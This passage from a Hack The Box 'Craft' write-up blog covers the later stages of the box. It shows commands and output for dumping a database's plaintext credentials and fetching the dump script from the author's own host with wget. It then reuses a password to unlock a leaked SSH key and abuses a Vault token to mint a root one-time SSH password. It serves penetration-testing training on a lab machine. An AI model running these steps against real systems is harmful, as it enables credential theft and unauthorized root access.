+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+
+<span class="kn">import</span> <span class="nn">pymysql</span>
+<span class="kn">from</span> <span class="nn">craft_api</span> <span class="kn">import</span> <span class="n">settings</span>
+
+<span class="c"># test connection to mysql database</span>
+
+<span class="n">connection</span> <span class="o">=</span> <span class="n">pymysql</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_HOST</span><span class="p">,</span>
+                             <span class="n">user</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_USER</span><span class="p">,</span>
+                             <span class="n">password</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_PASSWORD</span><span class="p">,</span>
+                             <span class="n">db</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_DB</span><span class="p">,</span>
+                             <span class="n">cursorclass</span><span class="o">=</span><span class="n">pymysql</span><span class="o">.</span><span class="n">cursors</span><span class="o">.</span><span class="n">DictCursor</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span> 
+    <span class="k">with</span> <span class="n">connection</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
+        <span class="n">sql</span> <span class="o">=</span> <span class="s">"SELECT * FROM user"</span>
+        <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">connection</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+<p><br>The table had all users credentials stored in plain text:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/app # wget http://10.10.xx.xx/db2.py
+Connecting to 10.10.xx.xx (10.10.xx.xx:80)
+db2.py               100% |********************************|   636  0:00:00 ETA
+
+/opt/app # python db2.py
+[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
+/opt/app # rm db2.py
+/opt/app #
+</code></pre></div></div>
+<p><br>Gilfoyle had a private repository called <code class="highlighter-rouge">craft-infra</code>:<br>
+<img src="/images/hackthebox/craft/16.png" alt="">
+<br><br>
+<img src="/images/hackthebox/craft/17.png" alt="">
+<br><br>He left his private <code class="highlighter-rouge">ssh</code> key in the repository:<br>
+<img src="/images/hackthebox/craft/18.png" alt="">
+<br><br>
+<img src="/images/hackthebox/craft/19.png" alt="">
+<br><br>When I tried to use the key it asked for password as it was encrypted, I tried his <code class="highlighter-rouge">gogs</code> password (<code class="highlighter-rouge">ZEU3N8WNM2rh4T</code>) and it worked:<br>
+<img src="/images/hackthebox/craft/20.png" alt="">
+<br><br>We owned user.</p>
+<hr>
+
+<h2 id="vault--one-time-ssh-password--ssh-as-root--root-flag">Vault –&gt; One-Time SSH Password –&gt; SSH as root –&gt; Root Flag</h2>
+<p><br>In Gilfoyle’s home directory there was a file called <code class="highlighter-rouge">.vault-token</code>:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gilfoyle@craft:~$ ls -la
+total 44
+drwx------ 5 gilfoyle gilfoyle 4096 Jan  3 13:42 .
+drwxr-xr-x 3 root     root     4096 Feb  9  2019 ..
+-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9  2019 .bashrc
+drwx------ 3 gilfoyle gilfoyle 4096 Feb  9  2019 .config
+drwx------ 2 gilfoyle gilfoyle 4096 Jan  3 13:31 .gnupg
+-rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8  2019 .profile
+drwx------ 2 gilfoyle gilfoyle 4096 Feb  9  2019 .ssh
+-r-------- 1 gilfoyle gilfoyle   33 Feb  9  2019 user.txt
+-rw------- 1 gilfoyle gilfoyle   36 Feb  9  2019 .vault-token
+-rw------- 1 gilfoyle gilfoyle 5091 Jan  3 13:28 .viminfo
+gilfoyle@craft:~$ cat .vault-token 
+f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$
+</code></pre></div></div>
+<p><br>A quick search revealed that it’s related to <a href="https://www.vaultproject.io/" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">vault</code></a>.</p>
+
+<blockquote>
+  <p>Secure, store and tightly control access to tokens, passwords, certificates, encryption keys for protecting secrets and other sensitive data using a UI, CLI, or HTTP API. -<a href="https://www.vaultproject.io/" target="_blank" rel="noopener noreferrer">vaultproject.io</a></p>
+</blockquote>
+
+<p><br>By looking at <code class="highlighter-rouge">vault.sh</code> from <code class="highlighter-rouge">craft-infra</code> repository (<code class="highlighter-rouge">vault/vault.sh</code>), we’ll see that it enables the <a href="https://www.vaultproject.io/docs/secrets/ssh/index.html" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">ssh</code> secrets engine</a> then creates an <a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">otp</code> role</a> for <code class="highlighter-rouge">root</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="c"># set up vault secrets backend</span>
+
+vault secrets <span class="nb">enable </span>ssh
+
+vault write ssh/roles/root_otp <span class="se">\</span>
+    <span class="nv">key_type</span><span class="o">=</span>otp <span class="se">\</span>
+    <span class="nv">default_user</span><span class="o">=</span>root <span class="se">\</span>
+    <span class="nv">cidr_list</span><span class="o">=</span>0.0.0.0/0
+</code></pre></div></div>
+<p><br>We have the token (<code class="highlighter-rouge">.vault-token</code>) so we can easily authenticate to the vault and create an <code class="highlighter-rouge">otp</code> for a root <code class="highlighter-rouge">ssh</code> session:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gilfoyle@craft:~$ vault login
+Token (will be hidden): 
+Success! You are now authenticated. The token information displayed below
+is already stored in the token helper. You do NOT need to run "vault login"
+again. Future Vault requests will automatically use this token.
+
+Key                  Value
+---                  -----
+token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
+token_duration       ∞
+token_renewable      false
+token_policies       ["root"]
+identity_policies    []
+policies             ["root"]
+gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=127.0.0.1
+Key                Value
+---                -----
+lease_id           ssh/creds/root_otp/f17d03b6-552a-a90a-02b8-0932aaa20198
+lease_duration     768h
+lease_renewable    false
+ip                 127.0.0.1
+key                c495f06b-daac-8a95-b7aa-c55618b037ee
+key_type           otp
+port               22
+username           root
+gilfoyle@craft:~$
+</code></pre></div></div>
+<p><br>And finally we’ll <code class="highlighter-rouge">ssh</code> into <code class="highlighter-rouge">localhost</code> and use the generated password (<code class="highlighter-rouge">c495f06b-daac-8a95-b7aa-c55618b037ee</code>):</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gilfoyle@craft:~$ ssh root@127.0.0.1
+
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+Password: 
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Aug 27 04:53:14 2019
+root@craft:~# 
+</code></pre></div></div>
+<p><br>
+<img src="/images/hackthebox/craft/21.png" alt="">
+<br><br>And we owned root !
+<br>That’s it , Feedback is appreciated !
+<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
+<br>Thanks for reading.
+<br>
+<br>
+<br>Previous Hack The Box write-up : <a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></p>
+<hr>
+
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>other posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/smasher2/">
+            Hack The Box - Smasher2
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/wall/">
+            Hack The Box - Wall
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/heist/">
+            Hack The Box - Heist
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>All Tags</h2>
+  <div class="tag-cloud">
+<a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-2">binary-exploitation</a> <a href="/tag/blockchain/" class="set-1">blockchain</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-2">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/elasticsearch/" class="set-1">elasticsearch</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/git/" class="set-1">git</a> <a href="/tag/javascript/" class="set-1">javascript</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/js/" class="set-1">js</a> <a href="/tag/kernel-exploitation/" class="set-1">kernel-exploitation</a> <a href="/tag/kibana/" class="set-1">kibana</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/logstash/" class="set-1">logstash</a> <a href="/tag/mmap/" class="set-1">mmap</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smart-contracts/" class="set-1">smart-contracts</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/solidity/" class="set-1">solidity</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/sudo/" class="set-1">sudo</a> <a href="/tag/suid/" class="set-1">suid</a> <a href="/tag/waf/" class="set-1">waf</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-2">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/winrm/" class="set-1">winrm</a> <a href="/tag/wordpress/" class="set-1">wordpress</a>
+</div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
+  <div class="wrapper">
+<div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked>
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+if (localStorage.getItem("theme") === null) {
+    window.localStorage.setItem('theme', 'dark');
+}
+const theme = localStorage.getItem('theme');
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+if (theme === "dark") {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+} else if (theme === "light") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+} else if  (userPrefers === "dark") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'dark');
+	document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	window.localStorage.setItem('theme', 'dark');
+	document.getElementById("theme-toggle").className = 'light';
+} else {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'light');
+	document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	window.localStorage.setItem('theme', 'light');
+	document.getElementById("theme-toggle").className = 'dark';
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    document.documentElement.setAttribute('data-theme', 'light');
+		document.documentElement.classList.add('theme--light');
+        document.documentElement.classList.remove('theme--dark');
+		window.localStorage.setItem('theme', 'light');
+	    document.getElementById("theme-toggle").className = 'dark';
+	} else {
+	    document.documentElement.setAttribute('data-theme', 'dark');
+		document.documentElement.classList.add('theme--dark');
+        document.documentElement.classList.remove('theme--light');
+		window.localStorage.setItem('theme', 'dark');
+	    document.getElementById("theme-toggle").className = 'light';
+	}
+}
+</script>
+</div>
+  
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
